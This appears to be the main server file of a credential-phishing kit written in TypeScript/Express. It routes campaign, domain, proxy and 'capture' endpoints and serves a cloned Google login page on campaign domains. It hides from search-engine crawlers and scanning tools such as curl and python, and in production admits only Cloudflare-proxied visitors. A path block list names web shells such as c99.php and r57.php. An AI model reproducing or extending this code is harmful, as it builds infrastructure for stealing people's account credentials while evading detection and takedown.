import express from 'express';
import http from 'http';
import cors from 'cors';
import cookieParser from 'cookie-parser';
import dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import prisma from './config/database';
import { logger } from './utils/logger.util';
import websocketService from './services/websocket.service';
import cleanupWorker from './workers/cleanup.worker';
import { accessLoggerMiddleware, botProtectionMiddleware } from './middleware/access-logger';

// Import routes
import authRoutes from './routes/auth/auth.routes';

// Admin routes
import adminTechniciansRoutes from './routes/admin/technicians.routes';
import adminSessionsRoutes from './routes/admin/sessions.routes';
import adminProfilesRoutes from './routes/admin/profiles.routes';
import adminCampaignProfilesRoutes from './routes/admin/campaign-profiles.routes';
import adminAnalyticsRoutes from './routes/admin/analytics.routes';
import adminResourcesRoutes from './routes/admin/resources.routes';
import adminStatsRoutes from './routes/admin/stats.routes';
import adminActivityRoutes from './routes/admin/activity.routes';
import adminDeploymentsRoutes from './routes/admin/deployments.routes';
import adminDomainsRoutes from './routes/admin/domains.routes';
import adminProxiesRoutes from './routes/admin/proxies.routes';
import adminWorkersRoutes from './routes/admin/workers.routes';
import adminSettingsRoutes from './routes/admin/settings.routes';
import adminCloudflareSettingsRoutes from './routes/admin/settings/cloudflare.routes';
import adminCloudflareAccountsRoutes from './routes/admin/settings/cloudflare-accounts.routes';
import adminSecurityIPShieldRoutes from './routes/admin/security/ipshield.routes';
import adminSecurityIPRulesRoutes from './routes/admin/security/ip-rules.routes';
import adminSecurityAccessLogRoutes from './routes/admin/security/access-log.routes';
import adminSecurityThreatsRoutes from './routes/admin/security/threats.routes';
import adminSecurityLogsRoutes from './routes/admin/security/logs.routes';

// Technician routes
import technicianCampaignsRoutes from './routes/technician/campaigns.routes';
import technicianSessionsRoutes from './routes/technician/sessions.routes';
import technicianProfilesRoutes from './routes/technician/profiles.routes';
import technicianAnalyticsRoutes from './routes/technician/analytics.routes';
import technicianDeploymentsRoutes from './routes/technician/deployments.routes';
import technicianSettingsRoutes from './routes/technician/settings.routes';
import technicianStatsRoutes from './routes/technician/stats.routes';
import technicianDomainsRoutes from './routes/technician/domains.routes';

// Public routes
import publicCaptureRoutes from './routes/public/capture.routes';
import publicSessionRoutes from './routes/public/session.routes';
import publicPreviewRoutes from './routes/public/preview.routes';
import publicDomainConfigRoutes from './routes/public/domain-config.routes';

dotenv.config();

const app = express();
const PORT = 8000; // Force port 8000 for backend

// ============================================
// MIDDLEWARE
// ============================================

// Remove Express fingerprint
app.disable('x-powered-by');

// CORS - Use environment variable for production, fallback to localhost for dev
const corsOrigins = process.env.CORS_ORIGINS 
  ? process.env.CORS_ORIGINS.split(',').map(o => o.trim())
  : [
      'http://localhost:3000',
      'http://localhost:3001',
      'https://fioona.org',
      process.env.WEB_PANEL_URL || '',
    ];

app.use(cors({
  origin: corsOrigins.filter(Boolean),
  credentials: true,
}));

// Body parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Path-based attack blocker - blocks malicious paths IMMEDIATELY before any processing
app.use((req, res, next) => {
  const blockedPaths = [
    '/vendor/',
    '/phpunit/',
    '/cgi-bin/',
    '/wanipcn',
    '/soap.cgi',
    '/HNAP1',
    '/eval-stdin',
    '/DeviceUpgrade',
    '/SDK/',
    '/.env',
    '/wp-admin',
    '/phpmyadmin',
    '/admin.php',
    '/xmlrpc.php',
    '/.git',
    '/config.php',
    '/shell.php',
    '/c99.php',
    '/r57.php',
    '/install.php',
  ];
  
  if (blockedPaths.some(p => req.path.includes(p))) {
    logger.warn(`Blocked malicious path: ${req.path} from ${req.ip}`);
    return res.status(403).end();
  }
  next();
});

// Access logger - logs all requests to AccessLog table
app.use(accessLoggerMiddleware);

// Bot protection - blocks known bots/scanners (except preview pages)
app.use(botProtectionMiddleware);

// Request logging
app.use((req, res, next) => {
  logger.http(req.method, req.path, res.statusCode);
  next();
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
  res.status(200).json({
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
  });
});

// ============================================
// API ROUTES
// ============================================

// Authentication routes
app.use('/api/auth', authRoutes);

// Admin routes
app.use('/api/admin/technicians', adminTechniciansRoutes);
app.use('/api/admin/sessions', adminSessionsRoutes);
app.use('/api/admin/profiles', adminProfilesRoutes);
app.use('/api/admin/campaign-profiles', adminCampaignProfilesRoutes);
app.use('/api/admin/analytics', adminAnalyticsRoutes);
app.use('/api/admin/resources', adminResourcesRoutes);
app.use('/api/admin/stats', adminStatsRoutes);
app.use('/api/admin/activity', adminActivityRoutes);
app.use('/api/admin/deployments', adminDeploymentsRoutes);
app.use('/api/admin/domains', adminDomainsRoutes);
app.use('/api/admin/proxies', adminProxiesRoutes);
app.use('/api/admin/workers', adminWorkersRoutes);
app.use('/api/admin/settings', adminSettingsRoutes);
app.use('/api/admin/settings/cloudflare', adminCloudflareSettingsRoutes);
app.use('/api/admin/settings/cloudflare', adminCloudflareAccountsRoutes);
app.use('/api/admin/security/ip-shield', adminSecurityIPShieldRoutes);
app.use('/api/admin/security/ip-rules', adminSecurityIPRulesRoutes);
app.use('/api/admin/security/access-log', adminSecurityAccessLogRoutes);
app.use('/api/admin/security/threats', adminSecurityThreatsRoutes);
app.use('/api/admin/security/logs', adminSecurityLogsRoutes);

// Technician routes
app.use('/api/campaigns', technicianCampaignsRoutes);
app.use('/api/sessions', technicianSessionsRoutes);
app.use('/api/profiles', technicianProfilesRoutes);
app.use('/api/analytics', technicianAnalyticsRoutes);
app.use('/api/deployments', technicianDeploymentsRoutes);
app.use('/api/domains', technicianDomainsRoutes);
app.use('/api/settings', technicianSettingsRoutes);
app.use('/api/technician/stats', technicianStatsRoutes);

// Public routes
app.use('/api/capture', publicCaptureRoutes);
app.use('/api/google/session', publicSessionRoutes);
app.use('/api/preview', publicPreviewRoutes);
app.use('/api/domain', publicDomainConfigRoutes);
app.use('/api/turnstile', publicDomainConfigRoutes);

// Serve login-pages assets — CSS, JS, images all resolve from here
app.use(
  '/static/login-pages',
  express.static(path.resolve(__dirname, '../login-pages'))
);

// Serve Next.js built assets from the login page — runtime chunk loader uses absolute /_next/ paths
app.use('/_next', express.static(path.resolve(__dirname, '../login-pages/google/_next')));

// ============================================
// VPS CATCH-ALL — DOMAIN-BASED LOGIN PAGE SERVING
// ============================================

app.get('*', async (req: any, res: any, next: any) => {
  try {
    const hostname = req.hostname;

    // Block bots before any DB call
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    const blockedAgents = [
      'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
      'yandexbot', 'ia_archiver', 'curl', 'wget', 'python', 'scrapy',
      'httpclient', 'java/', 'libwww', 'ahrefsbot', 'semrushbot',
      'dotbot', 'rogerbot', 'mj12bot', 'blexbot', 'megaindex'
    ];
    if (blockedAgents.some(b => ua.includes(b))) {
      return res.status(403).send('<html><body></body></html>');
    }

    // Production only: block direct VPS access — only accept CF-proxied traffic
    if (process.env.NODE_ENV === 'production') {
      const cfConnectingIp = req.headers['cf-connecting-ip'];
      const cfRay = req.headers['cf-ray'];
      if (!cfConnectingIp && !cfRay) {
        return res.status(403).send('<html><body></body></html>');
      }
    }

    // Find domain matching this hostname with an active campaign assigned
    const domain = await prisma.domain.findFirst({
      where: {
        name: hostname,
        status: 'active',
        activeCampaignId: { not: null }
      },
      include: { activeCampaign: true }
    });
    if (!domain || !domain.activeCampaign) return next();

    const campaign = domain.activeCampaign as any;
    // From backend/src/index.ts to backend/login-pages/google/index.html = ../login-pages/
    const indexPath = path.resolve(__dirname, '../login-pages/google/index.html');
    if (!fs.existsSync(indexPath)) return next();

    let html = fs.readFileSync(indexPath, 'utf-8');
    html = html
      .replace(/\{\{BACKEND_URL\}\}/g, process.env.BACKEND_URL || '')
      .replace(/\{\{CAPTURE_ID\}\}/g, campaign.captureId || '')
      .replace(/\{\{TURNSTILE_SITEKEY\}\}/g, domain.turnstileSitekey || campaign.turnstileSitekey || '');

    // Inject __PRXY_API_CONFIG__ AND base tag right after <head> opening - BEFORE any other scripts
    const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';
    const configScript = `<script>window.__PRXY_API_CONFIG__ = { apiBaseUrl: '${backendUrl}', captureId: '${campaign.captureId}', apiKey: 'default-api-key' };</script>`;
    html = html.replace('<head>', `<head><base href="/static/login-pages/google/">${configScript}`);

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.setHeader('X-Frame-Options', 'DENY');
    res.send(html);
  } catch {
    next();
  }
});

// ============================================
// 404 HANDLER
// ============================================

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route not found',
  });
});

// ============================================
// ERROR HANDLER
// ============================================

app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  logger.error('Server error:', err);
  
  res.status(500).json({
    success: false,
    error: 'Internal server error',
  });
});

// ============================================
// START SERVER
// ============================================

// Create HTTP server from Express app
const httpServer = http.createServer(app);

// Initialize WebSocket
websocketService.initialize(httpServer);

// Start cleanup worker
cleanupWorker.start();

// Start server
httpServer.listen(PORT, () => {
  logger.success(`🚀 FIONA Backend started on port ${PORT}`);
  logger.info(`📊 Environment: ${process.env.NODE_ENV || 'development'}`);
  logger.info(`🔗 Health check: http://localhost:${PORT}/health`);
  logger.info(`🔐 Auth endpoints: http://localhost:${PORT}/api/auth/*`);
  logger.info(`🔌 WebSocket: ws://localhost:${PORT}`);
  logger.info(`🧹 Cleanup worker: Active`);
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================

process.on('SIGTERM', async () => {
  logger.info('SIGTERM received, closing server gracefully...');
  cleanupWorker.stop();
  await prisma.$disconnect();
  httpServer.close(() => {
    logger.info('Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', async () => {
  logger.info('SIGINT received, closing server gracefully...');
  cleanupWorker.stop();
  await prisma.$disconnect();
  httpServer.close(() => {
    logger.info('Server closed');
    process.exit(0);
  });
});

export default app;
